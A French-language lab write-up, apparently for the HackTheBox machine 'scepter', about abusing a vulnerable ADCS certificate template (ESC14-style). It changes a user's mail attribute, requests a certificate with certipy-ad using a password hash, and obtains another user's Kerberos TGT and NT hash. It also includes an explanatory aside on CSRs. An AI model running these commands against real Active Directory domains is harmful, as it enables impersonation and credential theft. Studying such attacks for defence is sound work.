# Email Spoofing

***

## <mark style="color:red;">🧾 Exploitation ADCS via Email Spoofing dans le Template</mark>&#x20;

***

### <mark style="color:blue;">📍</mark> <mark style="color:blue;"></mark><mark style="color:blue;">**Contexte de l’attaque**</mark>

On est dans un environnement Active Directory avec un serveur ADCS (Certificate Authority). Un utilisateur légitime (`d.baker`) peut demander des certificats via un **template de certificat** : `StaffAccessCertificate`.

Le but final est de **demander un certificat pour un autre utilisateur** (`h.brown`) tout en se faisant passer pour lui, et ainsi obtenir :

* son **TGT Kerberos**
* son **NTLM hash**
* et potentiellement accéder à des privilèges plus élevés.

***

### <mark style="color:blue;">📎 Étapes techniques utilisées</mark>

***

#### <mark style="color:green;">🧩 1.</mark> <mark style="color:green;"></mark><mark style="color:green;">**Modification de l’attribut**</mark><mark style="color:green;">**&#x20;**</mark><mark style="color:green;">**`mail`**</mark><mark style="color:green;">**&#x20;**</mark><mark style="color:green;">**de d.baker**</mark>

```powershell
Set-ADUser d.baker -Replace @{mail='h.brown@scepter.htb'}
```

* Cette commande a été exécutée par un utilisateur ayant les droits `GenericAll` ou équivalent sur l’objet `d.baker`.
* Elle change l’adresse email (`proxyAddresses`, `mail`) de `d.baker` en **celle de `h.brown`**.

***

#### <mark style="color:green;">💣 2.</mark> <mark style="color:green;"></mark><mark style="color:green;">**Pourquoi ça marche ? Le template ADCS est vulnérable (ESC1/ESC14)**</mark>

Le template `StaffAccessCertificate` est :

* **Enrollable** par tout utilisateur membre du groupe "Staff"
* Ne nécessite **aucune validation d’identité stricte**
* Permet à l’utilisateur de fournir lui-même son **Subject Alternative Name (SAN)** : `email`, `UPN`, `DNS`, etc.

<mark style="color:green;">⚠️</mark> <mark style="color:green;"></mark><mark style="color:green;">**Les templates vulnérables sont ceux configurés avec :**</mark>

```plaintext
Subject Name: Supplied in Request
Subject Alternative Name: Email, UPN
```

{% hint style="info" %}
"Subject Name: Supplied in Request" signifie que le nom du sujet (Subject Name) du certificat sera fourni dans la **Certificate Signing Request (CSR)**.

***

<mark style="color:green;">**Qu'est-ce qu'un CSR ?**</mark>

Un CSR est une demande de certificat générée par l'entité qui veut obtenir un certificat. Elle contient :

```
- Clé publique du demandeur
- Informations d'identification (Subject Name)
- Attributs supplémentaires
- Signature de la demande avec la clé privée du demandeur
```

<mark style="color:green;">**Structure du Subject Name**</mark>

Le Subject Name contient les informations d'identification sous forme de **Distinguished Name (DN)** :

```
CN (Common Name) = www.example.com
O (Organization) = Mon Entreprise
OU (Organizational Unit) = IT Department  
L (Locality) = Paris
ST (State) = Île-de-France
C (Country) = FR
```

***

<mark style="color:green;">**Processus technique**</mark>

**1. Génération du CSR**

```bash
# Exemple avec OpenSSL
openssl req -new -key private.key -out certificate.csr

# L'outil demande :
Country Name (2 letter code) []: FR
State or Province Name []: Île-de-France
Locality Name []: Paris
Organization Name []: Mon Entreprise
Organizational Unit Name []: IT Department
Common Name []: www.example.com
Email Address []: admin@example.com
```

**2. Contenu du CSR**

```
-----BEGIN CERTIFICATE REQUEST-----
[Données encodées en Base64 contenant :]
- Version du CSR
- Subject Name (DN complet)
- Clé publique du demandeur
- Attributs/Extensions demandés
- Signature du CSR
-----END CERTIFICATE REQUEST-----
```

**3. Traitement par la CA**

Quand la CA reçoit le CSR :

```
1. Vérifie la signature du CSR (authentifie le demandeur)
2. Valide les informations du Subject Name
3. Vérifie que le demandeur a le droit d'utiliser ce nom
4. Extrait la clé publique du CSR
5. Crée le certificat final avec :
   - Subject Name du CSR
   - Clé publique du CSR
   - Issuer Name (nom de la CA)
   - Signature de la CA
```

<mark style="color:green;">**Validation du Subject Name**</mark>

#### Pour les certificats SSL/TLS :

* **Domain Validation (DV)** : vérification que le demandeur contrôle le domaine
* **Organization Validation (OV)** : vérification de l'identité de l'organisation
* **Extended Validation (EV)** : vérification approfondie de l'identité légale

***

<mark style="color:green;">**Méthodes de validation :**</mark>

```
DNS : ajout d'un enregistrement TXT spécifique
HTTP : placement d'un fichier sur le serveur web
Email : envoi d'un code à admin@domaine.com
Documents : fourniture de documents légaux
```
{% endhint %}

***

#### <mark style="color:green;">🏹 3.</mark> <mark style="color:green;"></mark><mark style="color:green;">**Demande de certificat avec le nouveau**</mark><mark style="color:green;">**&#x20;**</mark><mark style="color:green;">**`mail`**</mark>

```bash
certipy-ad req \
  -username d.baker@scepter.htb \
  -hashes 18b5fb0d99e7a475316213c15b6f22ce \
  -target dc01.scepter.htb \
  -ca 'scepter-DC01-CA' \
  -template 'StaffAccessCertificate'
```

* Certipy utilise **l'attribut `mail` du compte `d.baker`** pour construire le certificat.
* Comme `mail = h.brown@scepter.htb`, le certificat est signé comme s’il appartenait à `h.brown`.
* Résultat : on a un certificat qui **représente `h.brown`**, mais qui a été demandé par `d.baker`.

***

#### <mark style="color:green;">🎟️ 4.</mark> <mark style="color:green;"></mark><mark style="color:green;">**Utilisation du certificat pour obtenir un TGT de**</mark><mark style="color:green;">**&#x20;**</mark><mark style="color:green;">**`h.brown`**</mark>

```bash
certipy-ad auth -pfx d.baker.pfx -domain scepter.htb -dc-ip 10.10.11.65 -username h.brown
```

* Même si c’est le `.pfx` de `d.baker`, son certificat **identifie `h.brown`** via `mail` → donc le DC le traite comme tel.
* ➜ Le contrôleur de domaine délivre un **TGT valide pour `h.brown`**.

***

#### <mark style="color:green;">🔐 5.</mark> <mark style="color:green;"></mark><mark style="color:green;">**Extraction du hash NTLM de**</mark><mark style="color:green;">**&#x20;**</mark><mark style="color:green;">**`h.brown`**</mark>

```bash
[*] Trying to retrieve NT hash for 'h.brown'
[*] Got hash for 'h.brown@scepter.htb': aad3b4...:4ecf52...
```

Maintenant, l'attaquant peut :

* Utiliser WinRM avec ce compte
* Pivoter vers des privilèges plus élevés

***

### <mark style="color:blue;">Exemple de template vulnérable (</mark><mark style="color:blue;">`certutil -v -template StaffAccessCertificate`</mark><mark style="color:blue;">)</mark>

```
Subject Name:        Supply in Request
SubjectAltName:      Email
Permissions:
  Enroll: Domain Users
  Read/Write Attributes: Not enforced
```

***
